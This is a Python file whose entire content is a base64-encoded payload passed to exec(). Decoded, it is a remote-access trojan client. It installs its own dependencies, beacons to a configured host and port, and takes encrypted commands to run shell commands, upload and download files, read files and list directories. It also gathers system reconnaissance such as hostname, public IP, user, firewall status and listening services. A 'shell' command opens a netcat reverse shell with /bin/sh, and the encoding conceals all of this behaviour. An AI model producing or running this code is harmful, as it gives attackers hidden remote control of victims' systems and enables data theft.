import base64
exec(base64.b64decode(b'SE9TVCA9ICcwLjAuMC4wJwpQT1JUID0gOTk5OQppbXBvcnQgb3MKaW1wb3J0IHBsYXRmb3JtCmltcG9ydCB0aW1lCmltcG9ydCBqc29uCmltcG9ydCBpbXBvcnRsaWIKaW1wb3J0IHN1YnByb2Nlc3MgYXMgc3AKaW1wb3J0IHNvY2tldAojIGxpc3Qgb2YgdGhlIG1vZHVsZXMgeW91IGhhdmUgdG8gaW5zdGFsbCBtYW51YWxseQppbXBvcnRzID0gWyJyZXF1ZXN0cyJdCnRyeToKICAgIGZvciBpIGluIGltcG9ydHM6CiAgICAgICAgZ2xvYmFscygpW2ldID0gaW1wb3J0bGliLmltcG9ydF9tb2R1bGUoaSkKZXhjZXB0OgogICAgZm9yIGkgaW4gaW1wb3J0czoKICAgICAgICBzcC5jYWxsKFsicGlwMyIsICJpbnN0YWxsIiwgaV0pCiAgICBmb3IgaSBpbiBpbXBvcnRzOgogICAgICAgIGdsb2JhbHMoKVtpXSA9IGltcG9ydGxpYi5pbXBvcnRfbW9kdWxlKGkpCnRyeToKICAgIGZyb20gY3J5cHRvZ3JhcGh5LmZlcm5ldCBpbXBvcnQgRmVybmV0CmV4Y2VwdDoKICAgIG9zLnN5c3RlbSgicGlwIGluc3RhbGwgY3J5cHRvZ3JhcGh5IC1xIC1VIikKZmVybmV0ID0gIiIKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKCgpkZWYgZGVjcnlwdChkYXRhKToKICAgIHJldHVybiBmZXJuZXQuZGVjcnlwdChkYXRhKS5kZWNvZGUoKQoKCmRlZiBlbmNyeXB0KGRhdGEpOgogICAgcmV0dXJuIGZlcm5ldC5lbmNyeXB0KGRhdGEuZW5jb2RlKCkpCgoKd2hpbGUgVHJ1ZToKICAgIHRyeToKICAgICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgICAgIHMuY29ubmVjdCgoSE9TVCwgUE9SVCkpCiAgICBleGNlcHQgc29ja2V0LmVycm9yIGFzIGU6CiAgICAgICAgcHJpbnQoZSkKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgY29udGludWUKICAgIHByaW50KCJDb25uZWN0ZWQgdG8gU2VydmVyIikKICAgIGtleSA9IHMucmVjdigxMDI0KQogICAgZmVybmV0ID0gRmVybmV0KGtleSkKICAgIHMuc2VuZChlbmNyeXB0KHBsYXRmb3JtLnN5c3RlbSgpKSkKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBkYXRhID0gZGVjcnlwdChzLnJlY3YoMTAyNCkpCiAgICAgICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgogICAgICAgICAgICBzLmNsb3NlKCkKICAgICAgICAgICAgZXhpdCgwKSAKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZGF0YT0gZGF0YS5zcGxpdCgiOiIpCiAgICAgICAgb3B0aW9uID0gZGF0YVswXQogICAgICAgIGFyZ3MgPSBkYXRhWzE6XQogICAgICAgIG9wdGlvbiA9IG9wdGlvbi5sb3dlcigpCiAgICAgICAgaWYgb3B0aW9uID09ICJjbWQiOgogICAgICAgICAgICBzLnNlbmQoZW5jcnlwdChzcC5nZXRvdXRwdXQoYXJncykpKQogICAgICAgIGVsaWYgb3B0aW9uID09ICJjaGVjayI6CiAgICAgICAgICAgIHMuc2VuZChlbmNyeXB0KCIxIikpCiAgICAgICAgZWxpZiBvcHRpb24gPT0gImZpbGUtdSI6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGZpbGUgPSBzLnJlY3YoMTAyNCkKICAgICAgICAgICAgICAgIHdpdGggb3BlbihhcmdzLnNwbGl0KCJ8IilbMV0sICJ3YiIpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgZi53cml0ZShmaWxlKQogICAgICAgICAgICAgICAgcy5zZW5kKGVuY3J5cHQoIkZpbGUgVXBsb2FkZWQiKSkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgcy5zZW5kKGVuY3J5cHQoIiEiICsgc3RyKGUpKSkKICAgICAgICBlbGlmIG9wdGlvbiA9PSAiZmlsZS1kIjoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgd2l0aCBvcGVuKGFyZ3MsICJyYiIpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgcy5zZW5kZmlsZShmKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBzLnNlbmQoZW5jcnlwdCgiISIgKyBzdHIoZSkpKQogICAgICAgIGVsaWYgb3B0aW9uID09ICJjb250ZW50IjoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgd2l0aCBvcGVuKGFyZ3MpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgcy5zZW5kKGVuY3J5cHQoZi5yZWFkKCkpKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBzLnNlbmQoZW5jcnlwdCgiISIgKyBzdHIoZSkpKQogICAgICAgIGVsaWYgb3B0aW9uID09ICJpbmZvcyI6CiAgICAgICAgICAgICMgR2V0IFN5c3RlbSBJbmZvcwogICAgICAgICAgICBpbmZvcyA9IHt9CiAgICAgICAgICAgIGluZm9zWyJob3N0bmFtZSJdID0gc3AuZ2V0b3V0cHV0KCJob3N0bmFtZSIpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGluZm9zWyJyZW1vdGVfaXAiXSA9IHJlcXVlc3RzLmdldCgKICAgICAgICAgICAgICAgICAgICAiaHR0cHM6Ly9hcGkuaXBpZnkub3JnIikudGV4dAogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBpbmZvc1sicmVtb3RlX2lwIl0gPSBlCiAgICAgICAgICAgIGluZm9zWyJsb2NhbF9pcCJdID0gc29ja2V0LmdldGhvc3RieW5hbWUoc29ja2V0LmdldGhvc3RuYW1lKCkpCiAgICAgICAgICAgIGluZm9zWyJvcGVyYXRpbmdfc3lzdGVtIl0gPSBzcC5nZXRvdXRwdXQoInVuYW1lIC1hIikKICAgICAgICAgICAgaW5mb3NbInVzZXIiXSA9IHNwLmdldG91dHB1dCgid2hvYW1pIikKICAgICAgICAgICAgaW5mb3NbInB5dGhvbl92ZXJzaW9uIl0gPSBzcC5nZXRvdXRwdXQoInB5dGhvbjMgLVYiKQogICAgICAgICAgICBpbmZvc1siZGF0ZSJdID0gc3AuZ2V0b3V0cHV0KCJkYXRlIikKICAgICAgICAgICAgaW5mb3NbImZpcmV3YWxsIl0gPSBzcC5nZXRvdXRwdXQoInVmdyBzdGF0dXMiKQogICAgICAgICAgICBpbmZvc1sic3VkbyJdID0gc3AuZ2V0b3V0cHV0KCJzdWRvIC1WIikKICAgICAgICAgICAgaW5mb3NbInNlcnZpY2VzIl0gPSBzcC5nZXRvdXRwdXQoInNzIC10dWxwbiIpCiAgICAgICAgICAgIHMuc2VuZChlbmNyeXB0KGpzb24uZHVtcHMoaW5mb3MpKSkKICAgICAgICBlbGlmIG9wdGlvbiA9PSAiZGlyIjoKICAgICAgICAgICAgIyBHZXQgRGlyZWN0b3J5CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIG9zLmxpc3RkaXIoYXJncykKICAgICAgICAgICAgICAgIHMuc2VuZChlbmNyeXB0KHN0cihvcy5saXN0ZGlyKCkpKSkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgcy5zZW5kKGVuY3J5cHQoIiEiICsgc3RyKGUpKSkKICAgICAgICBlbGlmIG9wdGlvbiA9PSAiZXhpdCI6CiAgICAgICAgICAgICMgY2xlYXIgZXZlcnl0aGluZwogICAgICAgICAgICBleGl0KCkKICAgICAgICBlbGlmIG9wdGlvbiA9PSAic2hlbGwiOgogICAgICAgICAgICAjIG9wZW4gYSBzaGVsbAogICAgICAgICAgICBzcC5Qb3BlbihbIm5jIiwgYXJnc1swXSwgYXJnc1sxXSwgIi1lIC9iaW4vc2giXSkKICAgICAgICAgICAgcy5zZW5kKGVuY3J5cHQoIlNoZWxsIE9wZW5lZCIpKQo='))